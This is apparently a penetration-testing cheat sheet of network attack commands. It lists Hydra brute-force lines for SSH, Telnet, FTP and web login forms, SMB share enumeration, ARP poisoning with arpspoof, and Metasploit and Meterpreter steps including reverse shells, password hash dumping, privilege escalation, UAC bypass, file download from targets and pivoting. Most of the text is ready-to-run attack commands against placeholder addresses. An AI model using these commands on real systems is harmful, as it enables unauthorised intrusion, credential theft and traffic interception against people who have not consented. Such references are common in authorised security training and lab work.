---
description: SSH, Telnet, RDP, HTTP auth, Windows shares
---

# Network Attacks

## Hydra <a href="#hydra" id="hydra"></a>

### SSH <a href="#ssh" id="ssh"></a>

```
hydra -L users.txt -P pass.txt 10 10.10.10.10 ssh
```

### Telnet <a href="#telnet" id="telnet"></a>

```
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### FTP <a href="#ftp" id="ftp"></a>

```
hydra -L users.txt -P pass.txt ftp://10.10.10.10
```

### POST form login <a href="#post-form-login" id="post-form-login"></a>

```
hydra 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:statement for incorrect login" -L /usr/share/ncrack/minimal.usr -P /etc/john/rockyou.txt
```

Add`-f` to stop the brute-forcing after finding one valid cred.

* /etc/john/rockyou.txt for passwords.
* /usr/share/ncrack/minimal.usr for users.
* Sometimes you can just use the users list for the passwords too.

## Shares

### Shares Enumeration

```
nmblookup -A 10.10.10.10
```

### List Shares

```
smbclient -L //10.10.10.10 -N
```

### Mount Share

```
smbclient //10.10.10.10/sharename -N
```

### enum4linux <a href="#enum-4-linux" id="enum-4-linux"></a>

```
enum4linux -a 10.10.10.10
```

The above command does all the previous ones and gives you more data too except mounting the shares, which you have to implement using smbclient.

## ARP Poisoning <a href="#arp-poisoning" id="arp-poisoning"></a>

### arpspoof <a href="#arpspoof" id="arpspoof"></a>

\<interface> == eth0/tap0

```
arpspoof -i <interface> -t target -r host
```

## Metasploit

### Basic <a href="#basic" id="basic"></a>

```
search <term>
use <term>
info
show options
set <option> x
exploit
```

### Meterpreter <a href="#meterpreter" id="meterpreter"></a>

**bind\_tcp**: runs a server process on the target machine that waits for connections from the attacker machine.

**reverse\_tcp**: performs a TCP connection back to the attacker machine. Helps evade firewall rules.

```
background #backgrounds the current session
sessions -l
sessions -i %n
sysinfo
ifconfig, route
getuid
getsystem #windows privesc
bypassuac #if windows privesc fails
hashdump
cat '/path/to/file.txt'
download '/path/to/fileontarget.txt' /root/mymachine/
```

### Routing in Metasploit

Background the meterpreter of the session where you found the other subnet accessible.

```
use post/multi/manage/autoroute
route add <subnet> <session-id>
```

You have to input the session id of the meterpreter session.

Now the subnet is accessible in the whole of Metasploit-Framework.
